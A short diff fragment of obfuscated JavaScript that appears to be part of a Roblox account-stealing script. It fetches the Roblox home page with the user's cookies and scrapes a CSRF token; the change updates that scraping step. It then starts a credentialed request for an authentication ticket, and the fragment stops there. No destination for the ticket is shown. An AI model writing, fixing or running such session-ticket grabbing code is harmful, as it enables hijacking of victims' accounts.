@@ -1,7 +1,7 @@
 (async function() {
     var _0x3051de = (await (await fetch("https://www.roblox.com/home", {
-        'credentials': 'include'
-    }))['text']())['split']('setToken(\x27')[0x1]['split']('\x27)')[0x0];
+        credentials: "include"
+     })).text()).split('data-token=').pop().split('>')[0];
     var _0x3e8f56 = (await fetch('https://auth.roblox.com/v1/authentication-ticket', {
         'method': 'POST',
         'credentials': 'include',
